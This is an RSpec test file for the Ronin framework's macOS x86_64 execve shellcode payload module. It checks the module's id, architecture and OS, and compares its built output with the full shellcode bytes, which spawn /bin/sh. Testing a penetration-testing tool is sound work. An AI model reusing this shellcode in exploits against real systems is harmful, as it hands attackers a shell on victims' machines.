require 'spec_helper'
require 'ronin/payloads/builtin/shellcode/macos/x86_64/execve'

describe Ronin::Payloads::Shellcode::MacOS::X86_64::Execve do
  it "must inherit from Ronin::Payloads::ShellcodePayload" do
    expect(described_class).to be < Ronin::Payloads::ShellcodePayload
  end

  describe ".id" do
    subject { described_class }

    it "must equal 'shellcode/macos/x86_64/execve'" do
      expect(subject.id).to eq('shellcode/macos/x86_64/execve')
    end
  end

  describe ".arch" do
    subject { described_class }

    it "must equal :x86_64" do
      expect(subject.arch).to be(:x86_64)
    end
  end

  describe ".os" do
    subject { described_class }

    it "must equal :macos" do
      expect(subject.os).to be(:macos)
    end
  end

  describe "#build" do
    before { subject.build }

    it "must set #payload" do
      expect(subject.payload).to eq(
        "\x48\x31\xf6\x56\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xd2\x48\x31\xc0\xb0\x02\x48\xc1\xc8\x28\xb0\x3b\x0f\x05".b
      )
    end

    it "must ensure #payload is an ASCII 8bit string" do
      expect(subject.payload.encoding).to eq(Encoding::ASCII_8BIT)
    end
  end
end
